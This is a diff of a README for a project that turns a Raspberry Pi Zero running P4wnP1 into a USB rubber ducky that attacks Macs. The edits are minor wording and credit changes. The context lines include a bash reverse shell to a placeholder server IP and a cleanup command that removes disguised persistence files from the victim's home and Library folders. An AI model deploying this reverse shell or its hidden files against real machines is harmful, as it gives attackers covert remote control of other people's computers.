@@ -2,7 +2,7 @@
 
 [![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://github.com/ohbriansung/usb_rubber_ducky/blob/master/LICENSE)
 
-There are some threads about P4wnP1 ducky not running on Mac but here is an introduction about setting up P4wnP1 so your pi zero can attack Mac.
+There are some threads online about P4wnP1 ducky not running on Mac but here is an introduction about setting up P4wnP1 so your pi zero can attack Mac.
 
 ## Demo Video
 
@@ -86,7 +86,7 @@ bash -i >& /dev/tcp/YOUR_SERVER_IP/8080 0>&1
 ```
 
 3. On your server, when you see a connection being created, you then have bash access to the target machine. You would be able to see the output of bash directly on your machine with the setup above.
-4. In [payloads/](./payloads/) there is a reverse shell ducky script example. Here is the clean up script if you use my example.
+4. In [payloads](https://github.com/ohbriansung/usb_rubber_ducky/tree/master/pi_zero_ducky/payloads) folder there is a reverse shell ducky script example. Here is the clean up script if you use my example.
 
 ```shell
 rm ~/app_support.sh; rm /tmp/app_support.sh; rm ~/.ssh/rsa_pub_; rm ~/Library/.hidden/app_support.sh; rm ~/Library/Python3.65; rm /usr/local/bin/Python3.65;
@@ -121,7 +121,7 @@ Apparently, Apple has a very strong security and privacy. It's nearly impossible
 
 ## Author and Contributors
 
-- **[Brian Sung](https://github.com/ohbriansung)**
+- Chien-Yu \(Brian\) Sung
 - Jordan Aldujaili
 - Omar Sharif
 
